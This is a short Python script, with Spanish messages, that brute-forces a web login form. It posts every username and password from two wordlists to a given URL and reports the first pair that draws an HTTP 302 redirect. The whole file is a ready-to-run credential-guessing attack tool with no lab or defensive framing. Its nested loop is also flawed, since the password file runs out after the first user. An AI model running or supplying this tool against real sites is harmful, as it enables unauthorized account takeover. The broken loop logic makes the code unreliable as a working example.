import requests
import argparse

def brute_force_login(url, users_file, passwords_file):
    with open(users_file) as f_users, open(passwords_file) as f_passwords:
        for user in f_users:
            user = user.strip()
            for password in f_passwords:
                password = password.strip()
                data = {'username': user, 'password': password}
                response = requests.post(url, data=data, allow_redirects=False)
                if response.status_code == 302:
                    print(f"[+] Credenciales encontradas: Usuario - {user}, Contraseña - {password}")
                    return
    print("[-] No se encontraron credenciales válidas")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Script de fuerza bruta para ataque de inicio de sesión")
    parser.add_argument("url", help="URL del formulario de inicio de sesión")
    parser.add_argument("users_file", help="Ruta del archivo que contiene la lista de usuarios")
    parser.add_argument("passwords_file", help="Ruta del archivo que contiene la lista de contraseñas")
    args = parser.parse_args()

    brute_force_login(args.url, args.users_file, args.passwords_file)
